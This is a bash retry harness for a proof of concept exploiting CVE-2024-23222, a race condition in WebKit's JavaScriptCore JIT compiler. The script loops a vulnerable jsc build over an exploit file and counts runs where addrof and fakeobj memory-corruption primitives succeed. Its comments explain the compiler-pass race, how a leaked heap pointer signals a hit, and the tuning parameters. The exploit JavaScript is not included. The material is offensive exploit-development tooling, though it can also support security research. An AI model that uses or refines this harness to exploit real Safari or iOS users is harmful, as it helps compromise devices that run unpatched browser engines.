#!/bin/bash
# CVE-2024-23222 retry harness
#
# The race is one shot per process: the FTL only compiles trigger() once,
# and either the delete landed in the CFA->CFold gap or it didn't. So
# retrying means relaunching jsc. cassowary does this in a Worker on iOS;
# we just loop the binary.
#
# (An earlier version of this comment blamed cellLock store reordering.
# That was wrong: delete r.p2 is one store, there's nothing to reorder.
# The race is purely TOCTOU between two compiler passes reading the same
# main-thread structure transition.)
#
# Detection (release build, no addressOf):
#   miss -> lowBits = NaN bits (0x7ff8...) -> "does not look like a heap pointer"
#   hit  -> lowBits = real addr (0x0000XXXX...) -> "looks like a heap pointer"
#         AND fake !== pm.phantom (write side landed)

set -u

# Defaults match cve-2024-23222-rw.js on M-series.
POC="${POC:-poc/cve-2024-23222-rw.js}"
N="${N:-1000}"
WARMUP="${WARMUP:-250000}"
PIVOT="${PIVOT:-178000}"
GCFLUSH="${GCFLUSH:-1048576}"

# JSC path: macOS Xcode build is .../Release/jsc; JSCOnly (CMake) is .../Release/bin/jsc.
# Try the common locations if not given.
if [ -z "${JSC:-}" ]; then
    for c in \
        jsc-vuln/WebKit/WebKitBuild/Release/jsc \
        jsc-vuln/WebKit/WebKitBuild/Release-vanilla/jsc \
        jsc-vuln/WebKit/WebKitBuild/Release-jsconly/bin/jsc \
        WebKitBuild/Release/jsc \
        WebKitBuild/Release/bin/jsc
    do
        [ -x "$c" ] && { JSC="$c"; break; }
    done
fi
: "${JSC:?jsc not found; set JSC=/path/to/jsc}"

# Xcode-built jsc dynamically links JavaScriptCore.framework next to it. Without
# this it loads the system (patched) JSC and dies on a missing symbol. Harmless
# for the static JSCOnly build. (SIP strips DYLD_* when launching /bin/bash, so
# setting this in the *caller's* env doesn't survive into here; setting it here
# and passing it directly to jsc does, since jsc isn't SIP-protected.)
JSC_DIR=$(cd "$(dirname "$JSC")" && pwd)
export DYLD_FRAMEWORK_PATH="$JSC_DIR${DYLD_FRAMEWORK_PATH:+:$DYLD_FRAMEWORK_PATH}"

# Detection: addrof ground-truth match. The fakeobj write is the back half
# of the SAME confused trigger fire — if addrof matched, fakeobj landed too.
# (The PoC's separate fakeobj verification has a code path issue when
# addressOf() is called on the fake cell; we don't depend on it.)
HIT='✓ MATCH — addrof works'

[ -x "$JSC" ] || { echo "jsc not found: $JSC" >&2; exit 1; }

OUTDIR=$(mktemp -d /tmp/cve-2024-23222-retry.XXXXXX)
echo "jsc:     $JSC"
echo "poc:     $POC"
echo "tuning:  warmup=$WARMUP pivot=$PIVOT gc=$GCFLUSH"
echo "outdir:  $OUTDIR"
echo "attempts: $N"
echo

start=$(date +%s)
hits=0
for ((i=1; i<=N; i++)); do
    out="$OUTDIR/run-$i.txt"
    DYLD_FRAMEWORK_PATH="$DYLD_FRAMEWORK_PATH" "$JSC" "$POC" -- "$WARMUP" "$PIVOT" "$GCFLUSH" > "$out" 2>&1

    if grep -q "$HIT" "$out"; then
        hits=$((hits+1))
        elapsed=$(($(date +%s) - start))
        echo "  [$i] HIT #$hits (${elapsed}s) — saved $out"
        if [ "${STOP_ON_FIRST:-0}" = "1" ]; then
            echo
            cat "$out"
            exit 0
        fi
        continue
    fi

    rm -f "$out"
    [ $((i % 50)) -eq 0 ] && {
        elapsed=$(($(date +%s) - start))
        rate=$(echo "scale=1; $i / $elapsed" | bc 2>/dev/null || echo "?")
        echo "  [$i/$N] ${elapsed}s elapsed (~${rate} runs/s)"
    }
done

elapsed=$(($(date +%s) - start))
echo
if [ $hits -gt 0 ]; then
    rate=$(echo "scale=2; $hits * 100 / $N" | bc)
    echo "═══ $hits / $N hits (${rate}%) in ${elapsed}s ═══"
    echo "saved in $OUTDIR"
    exit 0
fi
echo "no hit after $N attempts (${elapsed}s)"
rmdir "$OUTDIR" 2>/dev/null
exit 1
